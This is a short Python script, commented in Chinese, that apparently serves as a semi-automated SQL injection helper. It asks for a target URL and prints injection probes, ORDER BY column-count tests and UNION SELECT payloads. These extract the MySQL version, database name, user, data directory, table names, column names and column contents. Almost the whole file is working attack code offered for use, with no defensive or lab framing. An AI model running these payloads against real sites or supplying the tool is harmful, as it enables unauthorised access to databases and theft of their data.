import urllib.parse

def detect_injection(url):
    test_payloads = [
        "'", 
        "' -- +",
        "' OR '1'='1 --+",
        "' OR '1'='2 --+",
        "' OR 1=1 -- +",
        "' OR 1=2 -- +",
    ]
    
    print("\n=== 注入检测payload ===")
    for i, payload in enumerate(test_payloads, 1):
        test_url = url + payload  # 移除urllib.parse.quote()
        print(f"[{i}] 测试payload: {test_url}")
    return input("\n请执行上述payload后，是否存在可注入点？(y/n): ").lower() == 'y'

def generate_payloads():
    url = input("请输入目标URL（包含参数）：").strip()
    
    if not detect_injection(url):
        print("未发现注入点")
        return

    # 列数探测
    print("\n=== 列数探测payload ===")
    for i in range(1, 11,2):
        test_url = url + f"' ORDER BY {i} --+ "  # 移除编码
        print(f"[ORDER BY {i}] {test_url}")
    num_columns = int(input("\n请输入实际列数（根据报错前的最大值）："))

    # 联合查询模板
    print("\n=== 联合查询payload ===")
    union_select = ", ".join(["NULL"] * num_columns)
    union_payload = url + f"' and 1=2 UNION SELECT {union_select} -- +"  # 移除编码
    print(f"[UNION测试] {union_payload}")
    
    # 回显点探测
    echo_point = input("\n请输入回显点位置（数字，从1开始）：")
    
    def make_payload(select_part):  # 修改后的make_payload函数
        parts = ["NULL"] * num_columns
        parts[int(echo_point)-1] = select_part
        return f"' and 1=2 UNION SELECT {', '.join(parts)} --+ "  # 移除编码

    # 数据库信息
    print("\n=== 数据库信息payload ===")
    for desc, payload in [
        ("版本信息", "version()"),
        ("数据库名", "database()"),
        ("当前用户", "user()"),
        ("数据目录", "@@datadir")
    ]:
        print(f"[{desc}] {url}{make_payload(payload)}")  # 直接拼接

    # 表结构探测
    print("\n=== 表结构payload ===")
    table_payload = url + make_payload("table_name FROM information_schema.tables WHERE table_schema=database()")
    print(f"[当前数据库表] {table_payload}")


    # 列名探测
    table_name = str(input("\n请输入表名："))
    hex_name =str("0x")+ table_name.encode().hex()
    print("\n=== 列名探测payload ===")
    column_payload = url + make_payload(f"group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='{table_name}'")
    column_hexpayload=url+make_payload(f"group_concat(hex(column_name)) FROM information_schema.columns WHERE table_schema=database() AND table_name={hex_name}")
    print(f"[列名探测] {column_payload}")
    print(f"[列名探测(表为16进制)] {column_hexpayload}")

    # 列值探测
    column_name = input("\n请输入列名：")
    column_price = url + make_payload(f"group_concat({column_name}) FROM {table_name}")
    print(f"[列值探测] {column_price}")
if __name__ == "__main__":
    generate_payloads()

